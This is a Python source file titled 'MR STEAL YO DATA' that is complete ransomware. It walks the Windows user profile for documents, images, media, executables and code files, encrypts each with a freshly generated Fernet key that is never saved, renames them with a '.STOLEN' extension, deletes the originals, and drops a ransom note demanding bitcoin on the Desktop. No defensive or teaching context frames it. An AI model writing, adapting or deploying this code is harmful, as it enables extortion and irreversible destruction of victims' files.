
        ####################
        # MR STEAL YO DATA #
        ####################

import random
from cryptography.fernet import Fernet
import os

NOTE='''HELLO!
MR "STEAL YO DATA" HAS VISITED!

AND HE REQUIRES A PAYMENT OF [REDACTED] BITCOIN TO GIVE YOUR DATA BACK!

HE HAS ENCRYPTED YOUR FILES, SO THEY ARE UNRECOVERABLE WITHOUT THE KEY.
SEND THE BITCOIN PAYMENT TO THIS ADDRESS: [REDACTED]

-MR STEAL YO DATA'''
TARGETS=[]
TARGETEXTS=['.txt','.png','.jpg','.jpeg','.mp3','.mp4','.exe','.zip','.rar','.dll','.doc','.docx','.pptx','.xml','.xls','.xlsx','.py','.c','.cs','.cpp','.rtf','.psd','.dat']
EXTENSION=".STOLEN"
KEY = Fernet.generate_key()

def gettargets():
        userpath = os.getenv('USERPROFILE')
        for r,d,f in os.walk(userpath):
                for directory in d:
                        try:
                                for file in os.listdir(r + '\\' + directory):
                                        try:
                                                if '.' + file.rsplit('.', 1)[1] in TARGETEXTS:
                                                        TARGETS.append(r + '\\' + directory + '\\' + file)
                                        except IndexError:
                                                pass
                        except PermissionError:
                                pass
def encrypt(filepath):
        with open(filepath, 'rb') as r:
                data = r.read()
                r.close()
        encrypteddata = Fernet(KEY).encrypt(data)
        with open(filepath + EXTENSION, 'wb') as w:
                w.write(encrypteddata)
                w.close()
        os.remove(filepath)
def leavenote():
        with open(os.getenv('USERPROFILE') + '\\Desktop\\README.txt', 'w') as w:
                w.write(NOTE)
                w.close()


def main():
        gettargets()
        for target in TARGETS:
                encrypt(target)
        leavenote()
